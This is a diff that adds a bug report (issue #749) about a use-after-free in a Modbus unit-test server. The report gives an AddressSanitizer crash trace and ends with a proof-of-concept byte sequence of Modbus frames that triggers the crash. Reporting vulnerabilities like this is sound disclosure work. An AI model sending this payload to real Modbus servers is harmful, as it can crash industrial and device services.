@@ -1,0 +1,13 @@
+issue #749
+
+Description
+A UAF vulnerability exists in unit-test-server that is triggered when a specific message is sent to unit-test-server. The vulnerability appears to be caused by the ctx->backend pointer at line 171 in modbus.c being incorrectly modified after multiple calls or used after free.
+
+Actual behavior if applicable
+==7657==ERROR: AddressSanitizer: SEGV on unknown address 0x605ffffffe90 (pc 0x56a769c5088e bp 0x7ffdc458eb90 sp 0x7ffdc458e900 T0)
+
+Expected behavior or suggestion
+no crash
+
+PoC
+<00><00><00><00><00><0d><ff><03><01><62><00><01><00><00><00><00><00><0d><ff><17><01><62><00><01><00><68><00><01><02><aa><bd><00><01><02>
